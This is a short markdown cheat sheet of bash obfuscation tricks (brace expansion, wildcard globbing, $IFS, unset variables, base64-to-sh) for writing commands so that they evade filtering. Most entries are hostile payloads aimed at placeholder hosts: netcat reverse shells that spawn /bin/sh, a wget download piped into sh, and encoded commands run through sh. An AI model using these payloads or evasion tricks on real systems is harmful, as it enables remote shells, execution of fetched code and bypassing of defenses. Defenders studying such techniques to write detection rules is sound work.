# [bash brace expansion](https://jon.oberheide.org/blog/2008/09/04/bash-brace-expansion-cleverness/):
#### `{wget,-O,X.X.X.X}` == `wget -O X.X.X.X`
  * [archived](https://web.archive.org/web/20190920163100/https://jon.oberheide.org/blog/2008/09/04/bash-brace-expansion-cleverness/)

# [command globbing](https://linux.die.net/man/7/glob):
#### `/???/?i?/n?t??t X.X.X.X YYY -e /???/?h` == `/usr/bin/netcat X.X.X.X YYY -e /bin/sh`

# [command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html):
#### `ping $(cat /some/file)`

# [encoded commands](https://serverfault.com/questions/896695/how-do-i-run-a-command-from-a-base64-encoded-string-in-bash):
#### `base64 -d <<< <base64_encoded_command> | sh`
  * [archived](https://web.archive.org/web/20190920162754/https://serverfault.com/questions/896695/how-do-i-run-a-command-from-a-base64-encoded-string-in-bash)

# [$IFS](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces):
#### `wget${IFS}-O${IFS}-${IFS}http://X.X.X.X/script${IFS}|${IFS}sh` == `wget -O - http://X.X.X.X/script | sh`
  * [archived](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces)
  * $IFS acts as a space, tab, and newline but can be manipulated to do different things

# [uninitialized environment variables](https://www.digitalocean.com/community/tutorials/how-to-read-and-set-environmental-and-shell-variables-on-a-linux-vps):
#### `nc$k -e /bin$k/sh$k X.X.X.X YYY` == `nc -e /bin/sh X.X.X.X YYY`
  * [archived](https://web.archive.org/web/20190920162908/https://www.digitalocean.com/community/tutorials/how-to-read-and-set-environmental-and-shell-variables-on-a-linux-vps)
  * using a variable that isn't set to anything results in an empty string

